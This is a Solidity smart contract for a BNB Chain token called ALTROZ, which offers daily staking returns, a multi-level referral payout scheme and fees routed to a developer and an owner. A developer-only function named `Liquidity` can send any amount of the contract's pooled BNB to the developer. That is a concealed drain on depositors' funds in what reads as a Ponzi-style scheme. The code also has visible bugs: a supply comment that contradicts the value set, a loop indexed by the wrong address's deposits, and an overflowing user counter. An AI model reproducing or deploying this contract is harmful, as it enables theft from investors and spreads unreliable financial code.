/**
 *Submitted for verification at BscScan.com on 2023-01-09
*/

pragma solidity ^0.5.17;

 /**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(uint quotient) {
        uint _numerator  = numerator * 10 ** (precision+1);
        uint _quotient =  ((_numerator / denominator) + 5) / 10;
        return (value*_quotient/1000000000000000000);
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract BEP20 {
 /*==============================
    =            EVENTS            =
    ==============================*/
    
    event onTokenPurchase(
        address indexed customerAddress,
        uint256 incomingBnb,
        uint256 tokensMinted,
        address indexed referredBy
    );
    
    event onTokenSell(
        address indexed customerAddress,
        uint256 tokensBurned,
        uint256 BnbEarned
    );
    
    event onReinvestment(
        address indexed customerAddress,
        uint256 BnbReinvested,
        uint256 tokensMinted
    );
    
    event onWithdraw(
        address indexed customerAddress,
        uint256 BnbWithdrawn
    );
    
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
	event Approval(
        address indexed owner, 
        address indexed spender,
        uint value
	);

    event Newbie(
        address user
    );
   
   
	function totalSupply() public view returns (uint256);
	function allowance(address owner, address spender)public view returns (uint);
    function transferFrom(address from, address to, uint value)public returns (bool ok);
    function approve(address spender, uint value)public returns (bool ok);
    function transfer(address to, uint value)public returns (bool ok);
    
}

contract ALTROZ is BEP20 {
    using SafeMath for uint256;

    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/
    
    string public name                                      = "ALTROZ";
    string public symbol                                    = "ALTZ";
    uint8 constant public constant decimals                 = 18;
    uint256 constant public INVEST_MIN_AMOUNT 				= 1*1e17;    // 0.1 BNB
  
    uint8 constant internal referralPer_                    = 12;
    uint8 constant internal developerPer_                   = 5;
    uint8 constant internal ownerPer_                   	= 10;
   
    uint8 internal stakePer_                                = 100;
    uint256 constant internal tokenPriceInitial_            = 10 finney; 
    uint256 constant internal tokenPriceIncremental_        = 0.001 finney;
    uint256 constant internal tokenPriceDecremental_        = 0.00095 finney;
	
    uint256 constant internal magnitude                     = 2**64;

     uint256 public _initialsupply                       = 250000000 * 10 ** 18;        // Initial supply 100 Million
	
	 uint256 public _ownersupply                         = 100000000 * 10 ** 18;       // Owner supply 100 Million
    
   
  
	uint256[] public PASSIVE_PERCENTS 	= [700, 500, 250, 150, 100, 50, 50];
	uint256 constant public PERCENT_STEP = 10;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public PLANPER_DIVIDER = 10000;
    uint256 constant public TIME_STEP = 1 days;

    uint256 public totaluserdeposit;
    uint8 public totalusers;
    uint256 public totalpayouttoken;
    uint256 public totalpayoutBnb;


    
    // Ambassador program
    mapping(address => bool) internal ambassadors_;
    uint256 constant internal ambassadorMaxPurchase_        = 1000 finney;
    uint256 constant internal ambassadorQuota_              = 1000 finney;

     struct Deposit {
        uint256 time;
        uint256 percent;
		uint256 incamount;
        uint256 tokenamount;
		uint256 start;
	}

    mapping(address => Deposit[]) internal deposits;

    
   /*================================
    =            DATASETS            =
    ================================*/
    
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal stakeBalanceLedger_;
    mapping(address => uint256) internal withdrawnstakeLedger_;
    mapping(address => uint256) internal withdrawnpassiveLedger_;
    mapping(address => uint256) internal stakingTime_;
    mapping(address => uint256) internal referralBalance_;
    mapping(address =>  uint256[5]) internal levels;

    mapping(address => address) internal upline;
    mapping(address => uint256) internal directbusiness;
    

    	
    mapping(address => address) internal referralLevel1Address;
    mapping(address => address) internal referralLevel2Address;
    mapping(address => address) internal referralLevel3Address;
    mapping(address => address) internal referralLevel4Address;
    mapping(address => address) internal referralLevel5Address;
    mapping(address => address) internal referralLevel6Address;
    mapping(address => address) internal referralLevel7Address;
   
    mapping(address => uint256) internal payoutsTo_;
    mapping(address => uint256) internal payouts_;
    mapping(address => uint256) internal ambassadorAccumulatedQuota_;
    uint256 internal tokenSupply_                           = 0;
    uint256 internal developerBalance                       = 0;
    uint256 internal profitPerShare_;
    mapping (address => uint256) balances;
	mapping(address => mapping(address => uint)) allowed;
    

    address payable public developer;
    address payable public owner;

    bool public onlyAmbassadors = false;
    
    /*=================================
    =            MODIFIERS            =
    =================================*/
    
     // Only people with tokens
    modifier onlybelievers () {
        require(myTokens() > 0);
        _;
    }
    
    // Only people with profits
    modifier onlyhodler() {
        require(myDividends(true) > 0);
        _;
    }
    
    // Only developer
    modifier onlyDeveloper(){
        require(developer == msg.sender);
        _;
    }
	
	// Only owner
    modifier onlyOwner(){
        require(owner == msg.sender);
        _;
    }
	
	
    
       
   

    /*=======================================
    =            PUBLIC FUNCTIONS            =
    =======================================*/
    /*
    * -- APPLICATION ENTRY POINTS --  
    */
    constructor(address payable developeradd,address payable owneradd) public {
        // add administrators here
        developer 	= developeradd;	
		owner 		= owneradd;	
        ambassadors_[address(0)] = true;

        ambassadors_[owner] = true;
          
        tokenBalanceLedger_[owner] = SafeMath.add(tokenBalanceLedger_[owner], _ownersupply);
       emit Transfer(address(this), owner, _ownersupply);
    }
     

    /**
     * WITHDRAW
     */
    function withdraw() onlyhodler() public {
        
        address _customerAddress            = msg.sender;
		uint256 withdrawamt;
        
		withdrawamt = SafeMath.add(payouts_[_customerAddress],referralBalance_[_customerAddress]);

        payouts_[_customerAddress] = 0;
        referralBalance_[_customerAddress]  = 0;

        uint256 contractBalance = address(this).balance;
        require(withdrawamt <= contractBalance);
        uint256 totaldeposit = getUserTotalDeposits(_customerAddress);

        require((totaldeposit.mul(3)) >= (payoutsTo_[_customerAddress].add(withdrawamt)));

		payoutsTo_[_customerAddress] = payoutsTo_[_customerAddress].add(withdrawamt);

        totalpayoutBnb = totalpayoutBnb + withdrawamt;
        msg.sender.transfer(withdrawamt);
        // fire event
        emit onWithdraw(_customerAddress, withdrawamt);
    }
    
    /**
     * SELL
     */
    function selltokens(uint256 _amountOfTokens) onlybelievers () public {
        address _customerAddress              = msg.sender;
        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _tokens                     = _amountOfTokens;
        uint256 _Bnb                        = tokensToBnb_(_tokens);
        uint256 _taxedBnb                   = _Bnb;
        
        tokenSupply_                        = SafeMath.sub(tokenSupply_, _tokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
        
        payouts_[_customerAddress]        += _taxedBnb;       
        
        emit onTokenSell(_customerAddress, _tokens, _taxedBnb);
    }
    
    /**
     * TRANSFER
     */
    function transfer(address _toAddress, uint256 _amountOfTokens) public returns(bool) {
        address _customerAddress            = msg.sender;
        
        require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        
        uint256 _taxedTokens                = _amountOfTokens;
       
        tokenSupply_                        = tokenSupply_;
        
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress]     = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
       
       
        emit Transfer(_customerAddress, _toAddress, _taxedTokens);
        return true;
    }
    
    /*----------  Owner ONLY FUNCTIONS  ----------*/
    
   
    function Liquidity(uint256 amount) onlyDeveloper() public{
			msg.sender.transfer(amount);
		
	}
    
    
    
    /*---------- CALCULATORS  ----------*/
    
    function totalBnbBalance() public view returns(uint) {
        return address(this).balance;
    }
   
       
    function totalSupply() public view returns(uint256) {
        return tokenSupply_ + _initialsupply;
    }
    
    
    function myTokens() public view returns(uint256) {
        address _customerAddress            = msg.sender;
        return stakebalance(_customerAddress);
    }
    
    
    function myDividends(bool _includeReferralBonus) public view returns(uint256) {
        address _customerAddress            = msg.sender;
        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;
    }
    
   
    function balanceOf(address _customerAddress) view public returns(uint256) {
        return tokenBalanceLedger_[_customerAddress];
    }
    
     function dividendsOf(address _customerAddress) view public returns(uint256) {
        return payouts_[_customerAddress];
    }

    function totalPayouts(address _customerAddress) view public returns(uint256) {
        return payoutsTo_[_customerAddress];
    }

    function getUserTotalDeposits(address userAddress) public view returns(uint256 incamount) {
		for (uint256 i = 0; i < deposits[userAddress].length; i++) {
			incamount = incamount.add(deposits[userAddress][i].incamount);
		}
	}
    
	function getUserReferrer(address userAddress) public view returns(address) {
		return upline[userAddress];
	}
	
	function getTeambusiness(address userAddress) public view returns(uint256) {
		return teambusiness[userAddress];
	}

    function getcontractdetails() public view returns(uint256 totaldeposit, uint8 users, uint256 payouttoken, uint256 payoutBnb ) {
		    totaldeposit    = totaluserdeposit;
            users           =  totalusers;
            payouttoken     =  totalpayouttoken;
            payoutBnb       = totalpayoutBnb;
	}

	 function transferFrom( address _from, address _to, uint256 _amount ) public returns (bool success) {
        require( _to != address(0));
        require(tokenBalanceLedger_[_from] >= _amount && allowed[_from][msg.sender] >= _amount && _amount >= 0);
        tokenBalanceLedger_[_from] = SafeMath.sub(tokenBalanceLedger_[_from],_amount);
        allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender],_amount);
        tokenBalanceLedger_[_to] = SafeMath.add(tokenBalanceLedger_[_to],_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    
    // Allow _spender to withdraw from your account, multiple times, up to the _value amount.
    // If this function is called again it overwrites the current allowance with _value.
    function approve(address _spender, uint256 _amount) public returns (bool success) {
        require( _spender != address(0));
        allowed[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
  
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require( _owner != address(0) && _spender !=address(0));
        return allowed[_owner][_spender];
    }
	
   
    function sellPrice() public view returns(uint256) {
        if(tokenSupply_ == 0){
            return tokenPriceInitial_       - tokenPriceDecremental_;
        } else {
            uint256 _Bnb               = tokensToBnb_(1e18);
            uint256 _taxedBnb          = _Bnb;
            return _taxedBnb;
        }
    }
    
   
    function buyPrice() public view returns(uint256) {
        if(tokenSupply_ == 0){
            return tokenPriceInitial_       + tokenPriceIncremental_;
        } else {
            uint256 _Bnb               = tokensToBnb_(1e18);
            return _Bnb;
        }
    }
   
    function calculateTokensReceived(uint256 _BnbToSpend) public view returns(uint256) {
       
        uint256 _amountOfTokens             = BnbToTokens_(_BnbToSpend);
        return _amountOfTokens;
    }
   
    function calculateBnbReceived(uint256 _tokensToSell) public view returns(uint256) {
        require(_tokensToSell <= tokenSupply_);
        uint256 _Bnb                   = tokensToBnb_(_tokensToSell);
        uint256 _taxedBnb             = _Bnb;
        return _taxedBnb;
    }
    
      
    
    function stakeprofit(address _customerAddress) public view returns(uint256){
         uint256 totalAmount;
        for (uint256 i = 0; i < deposits[_customerAddress].length; i++) {
        uint256 finish = deposits[_customerAddress][i].start.add(deposits[_customerAddress][i].time).mul(1 days);

			    if (stakingTime_[_customerAddress] < finish) {
                    uint256 share = (deposits[_customerAddress][i].tokenamount).mul(deposits[_customerAddress][i].percent).div(PLANPER_DIVIDER);
                    uint256 from = deposits[_customerAddress][i].start > stakingTime_[_customerAddress] ? deposits[_customerAddress][i].start : stakingTime_[_customerAddress];
                    uint256 to = finish < block.timestamp ? finish : block.timestamp;
                    if (from < to) {
                        totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					
				}

			}
        }
        
        return totalAmount;
    }

    function passiveprofit(address _customerAddress) public view returns(uint256){
        uint256 totalPassiveAmount;
		uint256 selfbusiness = getUserTotalDeposits(_customerAddress);

        for	(uint256 y=1; y<= referralCount_[_customerAddress]; y++)
		{
		    uint256 level;
		    address addressdownline;
		    
		    (addressdownline,level) = getDownlineRef(_customerAddress, y);
		
			address downline = addressdownline;

            if(selfbusiness >= 1*10**18 && teambusiness[_customerAddress] < 5*10**18){
                if(level <= 1){
                    for (uint256 i = 0; i < deposits[downline].length; i++) {
                        uint256 finish = deposits[downline][i].start.add(deposits[downline][i].time).mul(1 days);
                        if (stakingTime_[downline] < finish) {
                            uint256 share = (deposits[downline][i].tokenamount).mul(deposits[downline][i].percent).div(PLANPER_DIVIDER);
                            uint256 from = deposits[downline][i].start;
                            uint256 to = finish < block.timestamp ? finish : block.timestamp;
                            uint256 passiveshare = share.mul(PASSIVE_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
                            if (from < to) {
                                totalPassiveAmount = totalPassiveAmount.add(passiveshare.mul(to.sub(from)).div(TIME_STEP));
                                
                            }
                        }
                    }
                }
            }

            if(selfbusiness >= 2*10**18 && teambusiness[_customerAddress] < 20*10**18){
                if(level <= 4){
                    for (uint256 i = 0; i < deposits[downline].length; i++) {
                        uint256 finish = deposits[downline][i].start.add(deposits[downline][i].time).mul(1 days);
                        if (stakingTime_[downline] < finish) {
                            uint256 share = (deposits[downline][i].tokenamount).mul(deposits[downline][i].percent).div(PLANPER_DIVIDER);
                            uint256 from = deposits[downline][i].start;
                            uint256 to = finish < block.timestamp ? finish : block.timestamp;
                            uint256 passiveshare = share.mul(PASSIVE_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
                            if (from < to) {
                                totalPassiveAmount = totalPassiveAmount.add(passiveshare.mul(to.sub(from)).div(TIME_STEP));
                                
                            }
                        }
                    }
                }
            }
            if(selfbusiness >= 3*10**18 && teambusiness[_customerAddress] < 50*10**18){
                if(level <= 7){
                    for (uint256 i = 0; i < deposits[downline].length; i++) {
                        uint256 finish = deposits[downline][i].start.add(deposits[downline][i].time).mul(1 days);
                        if (stakingTime_[downline] < finish) {
                            uint256 share = (deposits[downline][i].tokenamount).mul(deposits[downline][i].percent).div(PLANPER_DIVIDER);
                            uint256 from = deposits[downline][i].start;
                            uint256 to = finish < block.timestamp ? finish : block.timestamp;
                            uint256 passiveshare = share.mul(PASSIVE_PERCENTS[level-1]).div(PERCENTS_DIVIDER);
                            if (from < to) {
                                totalPassiveAmount = totalPassiveAmount.add(passiveshare.mul(to.sub(from)).div(TIME_STEP));
                                
                            }
                        }
                    }
                }
            }
       
       
            
        }
        
        
        return totalPassiveAmount;
    }

    function passiveTokensremaining(address _customerAddress) public view returns(uint256){
            return SafeMath.sub(passiveprofit(_customerAddress),withdrawnpassiveLedger_[_customerAddress]);
    }

    function stakeTokensTime(address _customerAddress) public view returns(uint256){
        return stakingTime_[_customerAddress];
    }

    function stakebalance(address _customerAddress) public view returns(uint256){
        return stakeBalanceLedger_[_customerAddress];
    }

    function stakeprofitwithdraw(address _customerAddress) public view returns(uint256){
        return withdrawnstakeLedger_[_customerAddress];
    }

    function passiveprofitwithdraw(address _customerAddress) public view returns(uint256){
        return withdrawnpassiveLedger_[_customerAddress];
    }

    function referralbonus(address _customerAddress) public view returns(uint256){
        return referralBalance_[_customerAddress];
    }

    function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
		return (levels[userAddress]);
	}

	function getDirectbusiness(address userAddress) public view returns(uint256){
        return directbusiness[userAddress];
    }
	
    function getteambusiness(address userAddress) public view returns(uint256){
        return teambusiness[userAddress];
    }
   
    
    function gettokenprofit() onlybelievers () public returns(bool){
        address _customerAddress            = msg.sender;
    
        require(!onlyAmbassadors && stakingTime_[_customerAddress] > 0);
       
        uint256 roiTokens                   = stakeprofit(_customerAddress);
        uint256 passiveTokens               = passiveTokensremaining(_customerAddress);

        uint256 Totalwithdrawtoken 			= SafeMath.add(roiTokens,passiveTokens);
             
        
        tokenSupply_                        = SafeMath.add(tokenSupply_, Totalwithdrawtoken);
    
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], Totalwithdrawtoken);
        withdrawnstakeLedger_[_customerAddress] = SafeMath.add(withdrawnstakeLedger_[_customerAddress],roiTokens);
        withdrawnpassiveLedger_[_customerAddress] = SafeMath.add(withdrawnpassiveLedger_[_customerAddress],passiveTokens);

        totalpayouttoken = totalpayouttoken + Totalwithdrawtoken;

        stakingTime_[_customerAddress] = now;
        
    }

    function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256 percent, uint256 incamount, uint256 tokenamount, uint256 start, uint256 finish) {
        
		percent     = deposits[userAddress][index].percent;
		incamount   = deposits[userAddress][index].incamount;
        tokenamount = deposits[userAddress][index].tokenamount;
		start       = deposits[userAddress][index].start;
		finish      = deposits[userAddress][index].start.add(deposits[userAddress][index].time.mul(1 days));
    }

    
    
    /*==========================================
    =            INTERNAL FUNCTIONS            =
    ==========================================*/
    
   
    uint256 developerFee;
    uint256 ownerFee;
    uint256 incBnb;
    address _refAddress; 
    uint256 _referralBonus;
    
    
    uint256 bonusLv1;
    uint256 bonusLv2;
    uint256 bonusLv3;
	uint256 bonusLv4;
    uint256 bonusLv5;

    address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;
   
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
    mapping(address => uint256) public teambusiness;
	
	
	
	
    function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }
    
    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
    }

       
    function distributeRefBonus(uint256 _incomingBnb, address _referredBy, address _sender, bool _newReferral) internal {
        address _customerAddress        = _sender;
        uint256 remainingRefBonus       = _incomingBnb;
        uint256 _referralBonuses 		= _incomingBnb;
        
        bonusLv1                        = SafeMath.percent(_referralBonuses,50,100,18);
        bonusLv2                        = SafeMath.percent(_referralBonuses,30,100,18);
        bonusLv3                        = SafeMath.percent(_referralBonuses,20,100,18);
        bonusLv4                        = SafeMath.percent(_referralBonuses,10,100,18);
        bonusLv5                        = SafeMath.percent(_referralBonuses,10,100,18);
       
        
        
      
        referralLevel1Address[_customerAddress]                     = _referredBy;
        referralBalance_[referralLevel1Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel1Address[_customerAddress]], bonusLv1);
        remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv1);
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
        
        
      
        if(chkLv2 != address(0)) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            referralBalance_[referralLevel2Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel2Address[_customerAddress]], bonusLv2);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv2);
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
            }
        }
        
      
        if(chkLv3 != address(0)) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            referralBalance_[referralLevel3Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel3Address[_customerAddress]], bonusLv3);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv3);
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
            }
        }
        
      
        if(chkLv4 != address(0)) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
			referralBalance_[referralLevel4Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel4Address[_customerAddress]], bonusLv4);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv4);
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
            }
        }
        
      
        if(chkLv5 != address(0)) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
			referralBalance_[referralLevel5Address[_customerAddress]]   = SafeMath.add(referralBalance_[referralLevel5Address[_customerAddress]], bonusLv5);
            remainingRefBonus                                           = SafeMath.sub(remainingRefBonus, bonusLv5);
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
            }
        }
        
      
       
        developer.transfer(remainingRefBonus);
        
    }

    function buyTokens(address _referredBy) public payable returns(uint256) {
        
		uint256 deployerFee;
        address _customerAddress            = msg.sender;
        incBnb                              = msg.value;
        uint256 time;
        uint256 percent;
        require(msg.value >= INVEST_MIN_AMOUNT);

        if(incBnb >= 1*10**17 && incBnb <= 10*10**18) {
            time = 200;
            percent = 100;
        }
        if(incBnb >= 101*10**17 && incBnb <= 25*10**18) {
            time = 134;
            percent = 150;
        }
		if(incBnb >= 251*10**17 && incBnb <= 50*10**18) {
            time = 100;
            percent = 200;
        }
        if(incBnb >= 501*10**17) {
            time = 80;
            percent = 250;
        }
		
       
         _referralBonus                      = SafeMath.percent(incBnb,referralPer_,100,18);

         developerFee                      	= SafeMath.percent(incBnb,developerPer_,100,18);
         ownerFee                     		= SafeMath.percent(incBnb,ownerPer_,100,18);
       
        uint256 _amountOfTokens             = BnbToTokens_(incBnb);

        bool    _newReferral                = true;
        if(referralLevel1Address[_customerAddress] != address(0)) {
            _referredBy                     = referralLevel1Address[_customerAddress];
            _newReferral                    = false;
        }
        
        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));

        if (upline[_customerAddress] == address(0)) {
			if (_referredBy != msg.sender) {
				upline[_customerAddress] = _referredBy;
			}
            address sponser =_referredBy;
			for (uint256 i = 0; i < 5; i++) {
				if (sponser != address(0)) {
					levels[sponser][i] = levels[sponser][i].add(1);
					sponser = upline[sponser];
				} else break;
			}
        }
         address referr =_referredBy;
		for (uint256 i = 0; i < 7; i++) {
				if (referr != address(0)) {
					teambusiness[referr] = teambusiness[referr].add(msg.value);
					referr = upline[referr];
				} else break;
			}
		
        if(_referredBy != address(0) && _referredBy != _customerAddress && stakeBalanceLedger_[_referredBy] >= 0){

          directbusiness[_referredBy] = SafeMath.add(directbusiness[_referredBy],incBnb);
          distributeRefBonus(_referralBonus,_referredBy,_customerAddress,_newReferral);

        } else {
          deployerFee                = SafeMath.add(deployerFee, _referralBonus);
        }
       
        if(tokenSupply_ > 0){
         tokenSupply_                    = SafeMath.add(tokenSupply_, _amountOfTokens);
        } else {
             tokenSupply_                    = _amountOfTokens;
        }

       
        

	 if (deposits[msg.sender].length == 0) {

			 stakingTime_[msg.sender]      =  block.timestamp;
             totaluserdeposit = totaluserdeposit + incBnb;
             totalusers        = totalusers + 1;
             emit Newbie(msg.sender);
		}
       
        if (deposits[msg.sender].length != 0) {
        uint256 timediff                    = SafeMath.sub(block.timestamp, deposits[msg.sender][0].start);
        uint256 dayscount                   = SafeMath.div(timediff, 86400); //86400 Sec for 1 Day

        if(dayscount <= 15)
        {
			uint256 totaldeposit = (getUserTotalDeposits(msg.sender)+msg.value);
            
			if(totaldeposit >= 1*10**17 && totaldeposit <= 10*10**18) {
				for (uint256 i = 0; i < deposits[_referredBy].length; i++) {
					deposits[msg.sender][i].time = 200;	
					deposits[msg.sender][i].percent = 100;
				}
			}
			if(totaldeposit >= 101*10**17 && totaldeposit <= 25*10**18) {
				for (uint256 i = 0; i < deposits[_referredBy].length; i++) {
					deposits[msg.sender][i].time = 134;	
					deposits[msg.sender][i].percent = 150;
				}
			}
			if(totaldeposit >= 251*10**17 && totaldeposit <= 50*10**18) {
				for (uint256 i = 0; i < deposits[_referredBy].length; i++) {
					deposits[msg.sender][i].time = 100;	
					deposits[msg.sender][i].percent = 200;
				}
			}
			if(totaldeposit >= 501*10**17) {
				for (uint256 i = 0; i < deposits[_referredBy].length; i++) {
					deposits[msg.sender][i].time = 80;	
					deposits[msg.sender][i].percent = 250;
				}
			}
		
        }
        }

        deposits[msg.sender].push(Deposit(time,percent,incBnb,_amountOfTokens, block.timestamp));
		
        stakeBalanceLedger_[msg.sender] = SafeMath.add(stakeBalanceLedger_[_customerAddress], _amountOfTokens);
       
        developer.transfer(deployerFee);
        developer.transfer(developerFee);
        owner.transfer(ownerFee);
        
        emit onTokenPurchase(_customerAddress, incBnb, _amountOfTokens, _referredBy);
        return _amountOfTokens;
    }

   
    function BnbToTokens_(uint256 _Bnb) internal view returns(uint256) {
        uint256 _tokenPriceInitial          = tokenPriceInitial_ * 1e18;
        uint256 _tokensReceived             = 
         (
            (
                SafeMath.sub(
                    (sqrt
                        (
                            (_tokenPriceInitial**2)
                            +
                            (2*(tokenPriceIncremental_ * 1e18)*(_Bnb * 1e18))
                            +
                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
                            +
                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
                        )
                    ), _tokenPriceInitial
                )
            )/(tokenPriceIncremental_)
        )-(tokenSupply_);

        return _tokensReceived;
    }
    
    
     function tokensToBnb_(uint256 _tokens) internal view returns(uint256) {
        uint256 tokens_                     = (_tokens + 1e18);
        uint256 _tokenSupply                = (tokenSupply_ + 1e18);
        uint256 _etherReceived              =
        (
            SafeMath.sub(
                (
                    (
                        (
                            tokenPriceInitial_ +(tokenPriceDecremental_ * (_tokenSupply/1e18))
                        )-tokenPriceDecremental_
                    )*(tokens_ - 1e18)
                ),(tokenPriceDecremental_*((tokens_**2-tokens_)/1e18))/2
            )
        /1e18);
        return _etherReceived;
    }
    
    function sqrt(uint x) internal pure returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
    
}